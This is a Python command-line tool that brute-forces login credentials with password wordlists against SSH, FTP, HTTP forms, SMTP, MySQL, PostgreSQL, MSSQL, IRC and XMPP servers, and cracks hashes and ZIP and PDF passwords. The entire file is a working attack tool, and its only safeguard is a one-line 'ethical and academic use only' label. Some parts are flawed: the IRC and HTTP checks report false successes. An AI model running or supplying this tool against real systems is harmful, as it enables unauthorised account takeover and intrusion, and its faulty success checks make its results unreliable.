#!/usr/bin/env python3
import argparse
import threading
import multiprocessing
import queue
import socket
import sys
import time

# Protocol-specific imports
import paramiko        # SSH
import ftplib          # FTP
import requests        # HTTP/HTTPS
import smtplib         # SMTP
import pymysql         # MySQL
import psycopg2        # PostgreSQL
import pymssql         # MS SQL
import slixmpp         # XMPP (modern and maintained)
import hashlib         # for hash check
import zipfile         # ZIP bruteforce
import PyPDF2          # PDF password check
import bcrypt          # bcrypt hash

# ----------- Helper Functions ------------

def print_dbg(msg, debug):
    if debug:
        print(msg)

def print_error(msg, debug):
    print(f"[!] {msg}")
    if debug:
        import traceback
        traceback.print_exc()

# ----------- Brute force worker (threaded & multiproc) ------------

class BruteForceWorker(threading.Thread):
    def __init__(self, target_func, username_queue, password_queue, debug=False, result_flag=None):
        super().__init__()
        self.target_func = target_func
        self.username_queue = username_queue
        self.password_queue = password_queue
        self.debug = debug
        self.found = False
        self.result_flag = result_flag

    def run(self):
        while not (self.found or (self.result_flag and self.result_flag.is_set())):
            try:
                username = self.username_queue.get_nowait()
            except queue.Empty:
                return
            while True:
                try:
                    password = self.password_queue.get_nowait()
                except queue.Empty:
                    break
                try:
                    success = self.target_func(username, password)
                except Exception as e:
                    print_error(f"Unexpected error for {username}:{password} - {str(e)}", self.debug)
                    continue
                if success:
                    print(f"[+] Found credentials! {username}:{password}")
                    self.found = True
                    if self.result_flag:
                        self.result_flag.set()
                    # Put back unused items to avoid blocking other threads
                    self.username_queue.put(username)
                    return
                else:
                    print_dbg(f"[-] Failed {username}:{password}", self.debug)

# ----------- Protocol bruteforce implementations with error handling ------------

def is_connection_refused(e):
    return (
        isinstance(e, ConnectionRefusedError)
        or "refused" in str(e).lower()
        or "connection closed" in str(e).lower()
        or "timed out" in str(e).lower()
        or "broken pipe" in str(e).lower()
    )

# SSH
def ssh_bruteforce(username, password, target_ip, debug=False):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, username=username, password=password, timeout=5)
        ssh.close()
        return True
    except paramiko.ssh_exception.AuthenticationException:
        print_dbg(f"SSH fail: {username}:{password} -> authentication failed", debug)
        return False
    except Exception as e:
        if is_connection_refused(e):
            print_error(f"SSH connection refused or timed out for {target_ip}", debug)
        else:
            print_dbg(f"SSH fail: {username}:{password} -> {e}", debug)
        return False

# FTP
def ftp_bruteforce(username, password, target_ip, debug=False):
    try:
        ftp = ftplib.FTP()
        ftp.connect(target_ip, timeout=5)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return True
    except ftplib.error_perm as e:
        print_dbg(f"FTP fail: {username}:{password} -> permission error", debug)
        return False
    except Exception as e:
        if is_connection_refused(e):
            print_error(f"FTP connection refused or timed out for {target_ip}", debug)
        else:
            print_dbg(f"FTP fail: {username}:{password} -> {e}", debug)
        return False

# HTTP/HTTPS
def http_bruteforce(username, password, target_url, debug=False):
    login_data = {'username': username, 'password': password}
    try:
        r = requests.post(target_url, data=login_data, timeout=5)
        if "login failed" not in r.text.lower():
            return True
        else:
            print_dbg(f"HTTP fail: {username}:{password}", debug)
            return False
    except requests.exceptions.ConnectionError as e:
        print_error(f"HTTP connection refused or timed out for {target_url}", debug)
        return False
    except Exception as e:
        print_dbg(f"HTTP error: {e}", debug)
        return False

# SMTP
def smtp_bruteforce(username, password, smtp_server, port=25, use_ssl=False, debug=False):
    try:
        if use_ssl:
            server = smtplib.SMTP_SSL(smtp_server, port, timeout=5)
        else:
            server = smtplib.SMTP(smtp_server, port, timeout=5)
        server.ehlo()
        server.login(username, password)
        server.quit()
        return True
    except smtplib.SMTPAuthenticationError:
        print_dbg(f"SMTP fail: {username}:{password} -> authentication failed", debug)
        return False
    except Exception as e:
        if is_connection_refused(e):
            print_error(f"SMTP connection refused or timed out for {smtp_server}:{port}", debug)
        else:
            print_dbg(f"SMTP fail: {username}:{password} -> {e}", debug)
        return False

# MySQL
def mysql_bruteforce(username, password, target_ip, port=3306, debug=False):
    try:
        conn = pymysql.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
        conn.close()
        return True
    except pymysql.err.OperationalError as e:
        if "Access denied" in str(e):
            print_dbg(f"MySQL fail: {username}:{password} -> access denied", debug)
            return False
        elif is_connection_refused(e):
            print_error(f"MySQL connection refused or timed out for {target_ip}:{port}", debug)
            return False
        else:
            print_dbg(f"MySQL fail: {username}:{password} -> {e}", debug)
            return False
    except Exception as e:
        if is_connection_refused(e):
            print_error(f"MySQL connection refused or timed out for {target_ip}:{port}", debug)
        else:
            print_dbg(f"MySQL fail: {username}:{password} -> {e}", debug)
        return False

# PostgreSQL
def postgres_bruteforce(username, password, target_ip, port=5432, debug=False):
    try:
        conn = psycopg2.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
        conn.close()
        return True
    except psycopg2.OperationalError as e:
        if "authentication failed" in str(e).lower():
            print_dbg(f"PostgreSQL fail: {username}:{password} -> authentication failed", debug)
            return False
        elif is_connection_refused(e):
            print_error(f"PostgreSQL connection refused or timed out for {target_ip}:{port}", debug)
            return False
        else:
            print_dbg(f"PostgreSQL fail: {username}:{password} -> {e}", debug)
            return False
    except Exception as e:
        if is_connection_refused(e):
            print_error(f"PostgreSQL connection refused or timed out for {target_ip}:{port}", debug)
        else:
            print_dbg(f"PostgreSQL fail: {username}:{password} -> {e}", debug)
        return False

# MSSQL
def mssql_bruteforce(username, password, target_ip, port=1433, debug=False):
    try:
        conn = pymssql.connect(server=target_ip, user=username, password=password, port=port, timeout=5)
        conn.close()
        return True
    except pymssql.OperationalError as e:
        if "login failed" in str(e).lower():
            print_dbg(f"MSSQL fail: {username}:{password} -> login failed", debug)
            return False
        elif is_connection_refused(e):
            print_error(f"MSSQL connection refused or timed out for {target_ip}:{port}", debug)
            return False
        else:
            print_dbg(f"MSSQL fail: {username}:{password} -> {e}", debug)
            return False
    except Exception as e:
        if is_connection_refused(e):
            print_error(f"MSSQL connection refused or timed out for {target_ip}:{port}", debug)
        else:
            print_dbg(f"MSSQL fail: {username}:{password} -> {e}", debug)
        return False

# IRC (simplified: connect with password if needed)
def irc_bruteforce(username, password, target_ip, port=6667, debug=False):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, port))
        s.send(f"PASS {password}\r\n".encode())
        s.send(f"NICK {username}\r\n".encode())
        s.close()
        return True  # Assume success if no exception
    except Exception as e:
        if is_connection_refused(e):
            print_error(f"IRC connection refused or timed out for {target_ip}:{port}", debug)
        else:
            print_dbg(f"IRC fail: {username}:{password} -> {e}", debug)
        return False

# XMPP (using slixmpp)
class XmppBrute(slixmpp.ClientXMPP):
    def __init__(self, jid, password):
        super().__init__(jid, password)
        self.success = False
        self.add_event_handler("session_start", self.start)
        self.add_event_handler("failed_auth", self.failed)
        self.add_event_handler("disconnected", self.disconnected)
        self.connect_error = None

    async def start(self, event):
        self.success = True
        self.disconnect()

    async def failed(self, event):
        self.success = False
        self.disconnect()

    async def disconnected(self, event):
        pass

def xmpp_bruteforce(username, password, target_ip, port=5222, debug=False):
    jid = username # Should be a full JID like user@domain
    xmpp = XmppBrute(jid, password)
    try:
        # Connect to a specific server/port
        if xmpp.connect((target_ip, port), use_tls=True):
            xmpp.process(forever=False, timeout=5)
            if xmpp.success:
                return True
            else:
                print_dbg(f"XMPP fail: {username}:{password} -> authentication failed", debug)
                return False
        else:
            print_error(f"XMPP connection refused or timed out for {target_ip}:{port}", debug)
            return False
    except Exception as e:
        print_dbg(f"XMPP error {username}:{password} -> {e}", debug)
        return False

# Hash bruteforce (try multiple hash types)
def hash_bruteforce(target_hash, password_list, debug=False):
    hash_types = [
        ('sha256', lambda pwd: hashlib.sha256(pwd.encode()).hexdigest()),
        ('blake2b', lambda pwd: hashlib.blake2b(pwd.encode()).hexdigest()),
        ('sha512', lambda pwd: hashlib.sha512(pwd.encode()).hexdigest()),
        ('sha1', lambda pwd: hashlib.sha1(pwd.encode()).hexdigest()),
        ('md5', lambda pwd: hashlib.md5(pwd.encode()).hexdigest()),
    ]
    # Try normal hashes
    for hash_name, hash_func in hash_types:
        for pwd in password_list:
            pwd = pwd.strip()
            h = hash_func(pwd)
            if h == target_hash:
                print(f"[+] Found password for hash {target_hash}: {pwd} (algorithm: {hash_name})")
                return pwd
            else:
                print_dbg(f"Hash {hash_name} fail: {pwd}", debug)
    # Try bcrypt
    try:
        target_hash_bytes = target_hash.encode()
        for pwd in password_list:
            pwd = pwd.strip()
            try:
                if bcrypt.checkpw(pwd.encode(), target_hash_bytes):
                    print(f"[+] Found password for bcrypt hash {target_hash}: {pwd} (algorithm: bcrypt)")
                    return pwd
                else:
                    print_dbg(f"Hash bcrypt fail: {pwd}", debug)
            except Exception as e:
                print_dbg(f"Hash bcrypt error for {pwd}: {e}", debug)
    except Exception as e:
        print_dbg(f"bcrypt global error: {e}", debug)
    print("[-] Password not found for any supported hash type.")
    return None

# Zip file bruteforce
def zip_bruteforce(zip_path, password_list, debug=False):
    try:
        zf = zipfile.ZipFile(zip_path)
        for pwd in password_list:
            pwd_bytes = pwd.strip().encode('utf-8')
            try:
                zf.extractall(pwd=pwd_bytes)
                print(f"[+] Found ZIP password: {pwd}")
                return pwd
            except RuntimeError:
                print_dbg(f"ZIP fail: {pwd}", debug)
                continue
        print("[-] ZIP password not found.")
        return None
    except Exception as e:
        print(f"[-] ZIP file error: {e}")
        return None

# PDF bruteforce
def pdf_bruteforce(pdf_path, password_list, debug=False):
    try:
        reader = PyPDF2.PdfReader(pdf_path)
        for pwd in password_list:
            try:
                if reader.decrypt(pwd.strip()) == 1:
                    print(f"[+] Found PDF password: {pwd}")
                    return pwd
                else:
                    print_dbg(f"PDF fail: {pwd}", debug)
            except Exception:
                continue
        print("[-] PDF password not found.")
        return None
    except Exception as e:
        print(f"[-] PDF file error: {e}")
        return None

# ----------- Multiprocessing BruteForce Manager ------------

def multi_worker(target_func, usernames, passwords, debug, result_flag):
    username_queue = queue.Queue()
    password_queue = queue.Queue()
    for u in usernames:
        if u is not None:
            username_queue.put(u)
    for p in passwords:
        password_queue.put(p)

    threads = []
    for _ in range(4):  # 4 threads per process (tunable)
        t = BruteForceWorker(target_func, username_queue, password_queue, debug=debug, result_flag=result_flag)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

# ----------- Main CLI ------------

def main():
    parser = argparse.ArgumentParser(description="Advanced multi-protocol bruteforcer for ethical and academic use only.")
    parser.add_argument("target", nargs="?", help="Target URL or IP with protocol prefix (e.g., ssh://1.2.3.4, ftp://1.2.3.4, http://example.com)")
    parser.add_argument("-l", "--username", help="Single username to test")
    parser.add_argument("-L", "--userlist", help="File with multiple usernames")
    parser.add_argument("-P", "--passlist", required=True, help="Password list file")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of concurrent threads (default 4)")
    parser.add_argument("--dbg", action="store_true", help="Enable debug verbose output")
    parser.add_argument("-p", "--port", type=int, help="Port number if applicable")
    parser.add_argument("-S", "--ssl", action="store_true", help="Use SSL (only for SMTP, HTTP/HTTPS)")
    parser.add_argument("-f", "--file", help="File path (for zip/pdf/hash bruteforce)")

    args = parser.parse_args()

    # Load usernames
    usernames = []
    if args.username:
        usernames.append(args.username)
    elif args.userlist:
        try:
            with open(args.userlist, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[-] Could not open userlist: {e}")
            sys.exit(1)
    else:
        usernames = [None]

    # Load passwords
    try:
        with open(args.passlist, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[-] Could not open password list: {e}")
        sys.exit(1)

    # ---- FILE MODE -----
    if args.file and not args.target:
        # Decide based on file extension
        file_lower = args.file.lower()
        if file_lower.endswith(".zip"):
            zip_bruteforce(args.file, passwords, debug=args.dbg)
            return
        elif file_lower.endswith(".pdf"):
            pdf_bruteforce(args.file, passwords, debug=args.dbg)
            return
        elif file_lower.endswith(".hash"):
            try:
                with open(args.file, 'r') as f:
                    target_hash = f.readline().strip()
                hash_bruteforce(target_hash, passwords, debug=args.dbg)
            except Exception as e:
                print(f"[-] Error reading hash file: {e}")
            return
        else:
            print(f"[-] Unknown file type for brute-force: {args.file}")
            sys.exit(1)

    # ---- NETWORK MODE -----
    if not args.target:
        print("[-] Please specify a network target (protocol://ip) or a file with -f.")
        sys.exit(1)

    # Parse target protocol and host
    target = args.target
    if "://" not in target:
        print("[-] Target must be in protocol:// format")
        sys.exit(1)

    proto, target_rest = target.split("://", 1)
    target_ip = None
    target_port = args.port

    if proto in ["ssh", "ftp", "smb", "xmpp", "irc", "oracle", "mssql", "postgres"]:
        if ":" in target_rest:
            ip, port_str = target_rest.split(":", 1)
            target_ip = ip
            if not target_port:
                try:
                    target_port = int(port_str)
                except:
                    pass
        else:
            target_ip = target_rest
    elif proto in ["mysql"]:
        if ":" in target_rest:
            ip, port_str = target_rest.split(":", 1)
            target_ip = ip
            if not target_port:
                target_port = int(port_str)
        else:
            target_ip = target_rest
    elif proto in ["smtp"]:
        target_ip = target_rest
        if not target_port:
            target_port = 465 if args.ssl else 25
    elif proto in ["http", "https"]:
        target_ip = target_rest
    else:
        print(f"[-] Unsupported protocol: {proto}")
        sys.exit(1)

    # Select target function based on protocol
    if proto == "ssh":
        target_func = lambda u, p: ssh_bruteforce(u, p, target_ip, debug=args.dbg)
    elif proto == "ftp":
        target_func = lambda u, p: ftp_bruteforce(u, p, target_ip, debug=args.dbg)
    elif proto == "http" or proto == "https":
        target_func = lambda u, p: http_bruteforce(u, p, target, debug=args.dbg)
    elif proto == "smtp":
        target_func = lambda u, p: smtp_bruteforce(u, p, target_ip, port=target_port, use_ssl=args.ssl, debug=args.dbg)
    elif proto == "mysql":
        target_func = lambda u, p: mysql_bruteforce(u, p, target_ip, port=target_port or 3306, debug=args.dbg)
    elif proto == "postgres":
        target_func = lambda u, p: postgres_bruteforce(u, p, target_ip, port=target_port or 5432, debug=args.dbg)
    elif proto == "mssql":
        target_func = lambda u, p: mssql_bruteforce(u, p, target_ip, port=target_port or 1433, debug=args.dbg)
    elif proto == "irc":
        target_func = lambda u, p: irc_bruteforce(u, p, target_ip, port=target_port or 6667, debug=args.dbg)
    elif proto == "xmpp":
        target_func = lambda u, p: xmpp_bruteforce(u, p, target_ip, port=target_port or 5222, debug=args.dbg)
    else:
        print(f"[-] Protocol {proto} not implemented.")
        sys.exit(1)

    # ----------- Multiprocessing for speed -----------
    num_procs = max(1, args.threads // 4)
    manager = multiprocessing.Manager()
    result_flag = manager.Event()

    chunk_size = len(passwords) // num_procs
    password_chunks = [passwords[i*chunk_size:(i+1)*chunk_size] for i in range(num_procs)]
    if len(password_chunks) < num_procs:
        password_chunks += [[] for _ in range(num_procs - len(password_chunks))]
    if password_chunks and sum(len(x) for x in password_chunks) < len(passwords):
        password_chunks[-1].extend(passwords[sum(len(x) for x in password_chunks):])

    procs = []
    for i in range(num_procs):
        p = multiprocessing.Process(
            target=multi_worker,
            args=(target_func, usernames, password_chunks[i], args.dbg, result_flag)
        )
        procs.append(p)
        p.start()

    for p in procs:
        p.join()

    print("[*] Brute force finished.")

if __name__ == "__main__":
    main()
